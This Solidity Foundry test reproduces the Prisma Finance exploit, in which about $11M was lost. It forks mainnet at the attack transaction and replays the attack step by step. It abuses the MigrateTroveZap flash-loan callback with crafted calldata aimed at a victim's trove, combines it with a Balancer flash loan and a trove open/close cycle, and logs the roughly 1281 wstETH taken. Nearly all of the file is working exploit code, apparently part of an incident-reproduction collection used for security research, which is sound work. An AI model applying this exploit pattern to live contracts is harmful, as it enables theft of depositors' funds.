// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {Test, console2} from "forge-std/Test.sol";

// @KeyInfo - Total Lost: ~$11M
// Attacker: 0x7e39e3b3ff7adef2613d5cc49558eab74b9a4202
// Attack Contract: 0xd996073019c74b2fb94ead236e32032405bc027c
// Vulnerable Contract: 0xcc7218100da61441905e0c327749972e3cbee9ee
// Attack Tx: https://etherscan.io/tx/0x00c503b595946bccaea3d58025b5f9b3726177bbdc9674e634244135282116c7

// @Analyses
// https://twitter.com/EXVULSEC/status/1773371049951797485
// https://twitter.com/PrismaFi/status/1773371030129524957

/////////////////////////////////////// Interfaces ///////////////////////////////////////

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IMKUSDLoan {
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

interface IERC3156FlashBorrower {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}

interface IBorrowerOperations {
    function setDelegateApproval(address _delegate, bool _isApproved) external;

    function openTrove(
        address troveManager,
        address account,
        uint256 _maxFeePercentage,
        uint256 _collateralAmount,
        uint256 _debtAmount,
        address _upperHint,
        address _lowerHint
    ) external;

    function closeTrove(address troveManager, address account) external;
}

interface IPriceFeed {
    function fetchPrice(address _token) external returns (uint256);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract PrismaExploit is Test {
    IBalancerVault public vault;
    IPriceFeed public priceFeed;

    address public immutable wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address public immutable mkUSD = 0x4591DBfF62656E7859Afe5e45f6f47D3669fBB28;
    address public immutable MigrateTroveZap = 0xcC7218100da61441905e0c327749972e3CBee9EE;
    address public immutable BorrowerOperations = 0x72c590349535AD52e6953744cb2A36B409542719;
    address public immutable TroveManager = 0x1CC79f3F47BfC060b6F761FcD1afC6D399a968B6;
    address public immutable upperHint = 0xE87C6f39881D5bF51Cf46d3Dc7E1c1731C2f790A;
    address public immutable lowerHint = 0x89Ee26FCDFF6B109F81ABC6876600eC427F7907F;

    bytes32 private constant attackTx = hex"00c503b595946bccaea3d58025b5f9b3726177bbdc9674e634244135282116c7";

    function setUp() public {
        // set up the fork
        vm.createSelectFork("https://rpc.ankr.com/eth", attackTx);

        // chainlink price feed and balancer vault
        priceFeed = IPriceFeed(0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac);
        vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    }

    /////////////////////////////////////// Interfaces ///////////////////////////////////////

    function test_exploit() public {
        uint256 price = priceFeed.fetchPrice(wstETH);
        console2.log("Price Feed Price: ", price);

        // start with ~1800 mkUSD
        deal(address(mkUSD), address(this), 1_800_000_022_022_732_637);

        console2.log("Attacker start with ~1800 mkUSD: ", IERC20(mkUSD).balanceOf(address(this)));
        console2.log("start with wstETH balance before attack : ", IERC20(wstETH).balanceOf(address(this)));

        // get mkUSD loan

        //     address account,
        //     address troveManagerFrom,
        //     address troveManagerTo,
        //     uint256 maxFeePercentage,
        //     uint256 coll,
        //     address upperHint,
        //     address lowerHint

        // data
        // bytes memory data = hex"00000000000000000000000056a201b872b50bbdee0021ed4d1bb36359d291ed0000000000000000000000001cc79f3f47bfc060b6f761fcd1afc6d399a968b60000000000000000000000001cc79f3f47bfc060b6f761fcd1afc6d399a968b60000000000000000000000000000000000000000000000000011c3794b4c52ff0000000000000000000000000000000000000000000000191bf9b8cefc50317e000000000000000000000000e87c6f39881d5bf51cf46d3dc7e1c1731c2f790a00000000000000000000000089ee26fcdff6b109f81abc6876600ec427f7907f";

        uint256 amount = 1_442_100_643_475_620_087_665_721;

        address account = 0x56A201b872B50bBdEe0021ed4D1bb36359D291ED;
        address troveManagerFrom = address(TroveManager);
        address troveManagerTo = address(TroveManager);
        uint256 maxFeePercentage = 5_000_000_325_833_471;
        uint256 coll = 463_184_447_350_099_685_758;

        bytes memory data = abi.encode(
            account, troveManagerFrom, troveManagerTo, maxFeePercentage, coll, address(upperHint), address(lowerHint)
        );

        IMKUSDLoan(mkUSD).flashLoan(IERC3156FlashBorrower(address(MigrateTroveZap)), address(mkUSD), amount, data);

        address[] memory tokens = new address[](1);
        tokens[0] = address(wstETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1_000_000_000_000_000_000;

        uint256[] memory feeAmounts = new uint256[](1);
        feeAmounts[0] = 0;

        // get balancer wstETH loan
        vault.flashLoan(address(this), tokens, amounts, abi.encode(""));
    }

    function receiveFlashLoan(
        IERC20[] memory, /* tokens */
        uint256[] memory, /* amounts */
        uint256[] memory, /* feeAmounts */
        bytes memory /* userData */
    ) external {
        // approve borowOperations to spend wstETH with max amount
        IERC20(wstETH).approve(address(BorrowerOperations), type(uint256).max);

        // set delegate approval
        IBorrowerOperations(BorrowerOperations).setDelegateApproval(address(MigrateTroveZap), true);

        // // open trove
        IBorrowerOperations(BorrowerOperations).openTrove(
            address(TroveManager),
            address(this),
            5_000_000_325_833_471,
            1_000_000_000_000_000_000,
            2_000_000_000_000_000_000_000,
            address(upperHint),
            address(lowerHint)
        );

        // // another mkUSD loan
        // // // data
        // bytes memory data = hex"000000000000000000000000d996073019c74b2fb94ead236e32032405bc027c0000000000000000000000001cc79f3f47bfc060b6f761fcd1afc6d399a968b60000000000000000000000001cc79f3f47bfc060b6f761fcd1afc6d399a968b60000000000000000000000000000000000000000000000000011c3794b4c52ff0000000000000000000000000000000000000000000000458a6330674daf1a93000000000000000000000000e87c6f39881d5bf51cf46d3dc7e1c1731c2f790a00000000000000000000000089ee26fcdff6b109f81abc6876600ec427f7907f";

        uint256 amount = 2_000_000_000_000_000_000_000;

        address account = address(this);
        address troveManagerFrom = address(TroveManager);
        address troveManagerTo = address(TroveManager);
        uint256 maxFeePercentage = 5_000_000_325_833_471;
        uint256 coll = 1_282_797_208_306_130_557_587;

        bytes memory data = abi.encode(
            account, troveManagerFrom, troveManagerTo, maxFeePercentage, coll, address(upperHint), address(lowerHint)
        );

        IMKUSDLoan(mkUSD).flashLoan(IERC3156FlashBorrower(address(MigrateTroveZap)), address(mkUSD), amount, data);

        // cuurent contract mkUSD balance
        // console2.log("mkUSD balance before closing the trove: ", IERC20(mkUSD).balanceOf(address(this)));

        // close trove
        IBorrowerOperations(BorrowerOperations).closeTrove(address(TroveManager), address(this));

        uint256 returnAmount = 1_000_000_000_000_000_000;
        // transfer the wstETH loan back to the vault
        IERC20(wstETH).transfer(address(vault), returnAmount);

        // current contract wstETH balance
        console2.log("wstETH balance ~1281.79 ETH after attack: ", IERC20(wstETH).balanceOf(address(this)));
    }
}
